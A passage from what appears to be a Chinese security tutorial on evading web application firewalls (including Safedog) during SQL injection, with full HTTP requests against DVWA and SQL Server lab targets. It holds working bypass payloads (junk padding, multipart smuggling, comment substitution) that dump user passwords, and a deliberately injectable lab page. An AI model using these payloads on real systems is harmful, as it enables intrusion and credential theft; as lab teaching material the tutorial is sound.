<p>假如HTTP请求POST BODY太大，检测所有内容，WAF集群消耗太多的CPU、内存资源。因此许多WAF只检测前面的2M或4M的内容。对于攻击者而言，只需要在POST BODY前面添加许多无用的数据，把攻击的payload放在最后即可绕过WAF检测。</p>
<p><strong>绕过技巧</strong>：</p>
<ul>
<li>GET型请求转POST型</li>
<li>Content-Length头长度大于8200</li>
<li>正常参数在脏数据后面，否则无效</li>
</ul>
<p><strong>数据包构造</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dvwa/vulnerabilities/sqli/?Submit=Submit HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8200</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit</span><br><span class="line">Cookie: security=low; ECS[visit_times]=1; PHPSESSID=90a4331de18bcd32ee2d780254f44589</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line"></span><br><span class="line">a=/*AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCCCCCCCCDDDDDBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCSSSSSSSSSSSSSSSSSSSSSSSSSSSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB&amp;id=1&#x27; union select null,concat_ws(char(32,58,32),user,password) from users%23</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/15/TGSn9jEO6YJwzKL.png" alt="image-20211015235313081"></p>
<h3 id="函数分隔符绕过"><a href="#函数分隔符绕过" class="headerlink" title="函数分隔符绕过"></a>函数分隔符绕过</h3><h4 id="绕过原理-1"><a href="#绕过原理-1" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>规则缺陷/特性：函数与括号之间插入分隔符可以正常执行</strong></p>
<p>对基于正则表达式的WAF，我们猜测安全工程师写WAF规则时，可能不知道函数名与左括号之间可以存在特殊字符，或者遗漏可以存在特殊字符。例如匹配函数”concat()”的规则写法，“concat(”或者”concat\s*(”，就没有考虑到一些特殊字符。相应的绕过方法，在特殊位置引入特殊的分隔符，逐个测试。这些特殊分隔符发现也是通过Fuzz出来的。</p>
<p><strong>绕过技巧</strong>：</p>
<ul>
<li>函数与括号之间可以插入空白符或多行注释达到绕过</li>
<li>GET型请求转POST型</li>
</ul>
<p><strong>数据包构造</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dvwa/vulnerabilities/sqli/?Submit=Submit HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 83</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit</span><br><span class="line">Cookie: security=low; ECS[visit_times]=1; PHPSESSID=90a4331de18bcd32ee2d780254f44589</span><br><span class="line"></span><br><span class="line">id=-1&#x27; union select null,concat_ws(char%0a%0d(32,58,32),user,password) from users #</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/16/lhWsHSvDfrwjN2Q.png" alt="image-20211016103625239"></p>
<h3 id="协议未覆盖绕过"><a href="#协议未覆盖绕过" class="headerlink" title="协议未覆盖绕过"></a>协议未覆盖绕过</h3><h4 id="绕过原理-2"><a href="#绕过原理-2" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>HTTP协议兼容性：HTTP Body多样性</strong></p>
<p>在 http 头里的 Content-Type 提交表单支持四种协议：</p>
<ul>
<li>application/x-www-form-urlencoded  -编码模式</li>
<li>multipart/form-data  -文件上传模式</li>
<li>text/plain  -文本模式</li>
<li>application/json  -json模式</li>
</ul>
<p>文件头的属性是传输前对提交的数据进行编码发送到服务器。其中 multipart/form-data 表示该数据被编码为一条消息,页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。</p>
<p><strong>绕过技巧</strong>：</p>
<ul>
<li>使用表单请求中的multipart/form-data</li>
<li>关键词换行</li>
<li>GET型请求转POST型</li>
</ul>
<p><strong>数据包构造</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dvwa/vulnerabilities/sqli/?Submit=Submit HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Length: 218</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit</span><br><span class="line">Cookie: security=low; ECS[visit_times]=1; PHPSESSID=90a4331de18bcd32ee2d780254f44589</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">id=-1&#x27; union select null,concat_ws</span><br><span class="line"></span><br><span class="line">(char(32,58,32),user,password) </span><br><span class="line"></span><br><span class="line">from users #</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA--</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/16/iybr6tfZzQsVJnO.png" alt="image-20211016111037975"></p>
<h3 id="多行注释符替换绕过"><a href="#多行注释符替换绕过" class="headerlink" title="多行注释符替换绕过"></a>多行注释符替换绕过</h3><h4 id="绕过原理-3"><a href="#绕过原理-3" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>规则缺陷/特性：数据库空格可使用其它字符替代</strong></p>
<p>因为注释符#、— 都是把后面的语句全部注释掉了，而多行注释/**/则是注释指定部分，需要一前一后闭合，所以在传参那里几乎不做注释语句用，而是用于过滤空格等bypass。</p>
<p>在进行SQL语句查询的时候可以利用注释符来替代语法中的空格，例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [dbo].[<span class="keyword">User</span>] <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>可替代为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>[dbo].[<span class="keyword">User</span>]<span class="comment">/**/</span><span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>那么意味着在注释符中可以添加大量的无效字符来打破WAF的规则匹配。</p>
<p><strong>绕过技巧</strong>：</p>
<ul>
<li>使用多行注释符/**/来构造payload进行绕过</li>
</ul>
<p>使用order by语句进行测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+order by 2+%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line"># 被拦截</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/16/tnBhzJPOFDXUjox.png" alt="image-20211016145100751"></p>
<p><code>/**/</code>替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+order/**/by 2+%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line"># 被拦截</span><br></pre></td></tr></table></figure>
<p><code>/*--*/</code>替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+order/*--*/by 2+%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line"># 被拦截</span><br></pre></td></tr></table></figure>
<p><code>/*//*/</code>替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+order/*//*/by 2+%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line"># 不拦截</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/16/ISpgjVWdTlus1xE.png" alt="image-20211016145143507"></p>
<p>再使用union select语句进行测试</p>
<p><img src="https://i.loli.net/2021/10/16/ldBFst71nVmaO4j.png" alt="image-20211016150036280"></p>
<p>得出可以使用<code>/*//*/</code>代替空格来进行绕过获取数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+union/*//*/select 1,concat_ws(char(32,58,32),user,password) from/*//*/users+%23&amp;Submit=Submit#</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/16/ZkhTPXifCQYWKIr.png" alt="image-20211016150953965"></p>
<h2 id="Bypass安全狗SQLServer注入"><a href="#Bypass安全狗SQLServer注入" class="headerlink" title="Bypass安全狗SQLServer注入"></a>Bypass安全狗SQLServer注入</h2><h3 id="SQLServer特性"><a href="#SQLServer特性" class="headerlink" title="SQLServer特性"></a>SQLServer特性</h3><p><strong>空格可以由其它字符替代</strong></p>
<blockquote>
<p>select id,contents,time from news where news_id=1<span style="color:red">①</span>union<span style="color:red">②</span>select<span style="color:red">③</span>1,2,db_name()<span style="color:red">④</span>from<span style="color:red">⑤</span>admin</p>
</blockquote>
<ul>
<li><p>位置①</p>
<ul>
<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
<li>可以利用注释符号：/**/、—+a%0d%0a</li>
<li>可利用数学运算符以及数据类型：news_id=1.0，news_id=1e0，news_id=1-1</li>
</ul>
</li>
<li><p>位置②</p>
<ul>
<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
<li>可以利用注释符号：/**/、—+a%0d%0a</li>
<li>可以利用加号+替换空格：union+select</li>
</ul>
</li>
<li><p>位置③</p>
<ul>
<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
<li>可以利用注释符号：/**/、—+a%0d%0a</li>
<li>可利用数学运算符：+、-、~、.    （注：其中-、~、.号必须是select查询的第一个字段的数据类型为数字型才能使用）</li>
<li>可以利用小括号()替换空格：select(1),2,db_name()</li>
</ul>
</li>
<li><p>位置④</p>
<ul>
<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
<li>可以利用注释符号：/**/、—+a%0d%0a</li>
<li>可利用其他字符：%80~%FF（需要IIS服务器支持）</li>
</ul>
</li>
<li><p>位置⑤</p>
<ul>
<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
<li>可以利用注释符号：/**/、—+a%0d%0a</li>
<li>可利用其他字符：%80~%FF（需要IIS服务器支持）</li>
<li>可以利用点号.替换空格：from.users</li>
<li>可以利用中括号[]替换空格：from[users]</li>
</ul>
</li>
</ul>
<h3 id="实验靶场-1"><a href="#实验靶场-1" class="headerlink" title="实验靶场"></a>实验靶场</h3><p>数据库：SQL Server 2008R2</p>
<p>Web服务器： IIS7.5 CN</p>
<p>WAF：网站安全狗（IIS版）v4.0.3215</p>
<p>靶场源码如下：index.aspx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; AutoEventWireup=&quot;true&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace=&quot;System.Data&quot; %&gt;</span><br><span class="line">&lt;%@ Import namespace=&quot;System.Data.SqlClient&quot;  %&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;script runat=&quot;server&quot;&gt;</span><br><span class="line">    private DataSet resSet=new DataSet();</span><br><span class="line">    protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        String strconn = &quot;server=.;database=test;uid=sa;pwd=admin&quot;;</span><br><span class="line">		string id = Request.Params[&quot;id&quot;];</span><br><span class="line">        string sql = string.Format(&quot;select * from newss where id=&#123;0&#125;&quot;, id);</span><br><span class="line">        SqlConnection connection=new SqlConnection(strconn);</span><br><span class="line">        connection.Open();</span><br><span class="line">        SqlDataAdapter dataAdapter = new SqlDataAdapter(sql, connection);</span><br><span class="line">        dataAdapter.Fill(resSet);</span><br><span class="line">        DgData.DataSource = resSet.Tables[0];</span><br><span class="line">        DgData.DataBind();</span><br><span class="line">        Response.Write(&quot;执行语句:&lt;br&gt;&quot;+sql);</span><br><span class="line">        Response.Write(&quot;&lt;br&gt;结果为:&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span 